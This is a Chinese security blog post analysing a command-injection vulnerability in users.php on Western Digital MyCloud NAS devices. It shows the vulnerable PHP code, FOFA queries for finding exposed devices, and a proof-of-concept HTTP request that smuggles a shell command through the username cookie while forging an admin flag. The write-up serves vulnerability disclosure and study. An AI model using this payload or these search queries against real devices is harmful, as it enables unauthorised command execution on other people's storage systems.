---
title: "西部数码 NAS users.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-users-rce.html
asset_dir: assets/西部数码-nas-users.php-命令执行漏洞
---

# 西部数码 NAS users.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/10 12:35
- 824浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

安全认证考试

安全

Nessus

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS users.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `users.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

$username = $_COOKIE['username'];
exec("wto -n \"$username\" -g", $ret);
```

深入探索

网络安全课程

漏洞扫描器

技术文章订阅

从 `$_COOKIE` 中获取 `username` 参数，在未进行任何过滤或转义的情况下，直接将其拼接到 `exec()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 [RCE](https://mrxn.net/tag/rce)的效果。

计算机驱动器和存储设备

# 漏洞复现

```
GET /web/php/users.php HTTP/1.1
Host: west.nas.mrxn.net
Cookie: isAdmin=1;username=a" `sleep 3` "
```

[![西部数码 NAS users.php 命令执行漏洞](images/img-001-36b128e963f8.webp)](https://image.mrxn.net/fb519ee3f3004958adb3b20582779f64.webp)

成功延时 3 秒

硬盘驱动器

- 标签：
- [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

计算机服务器
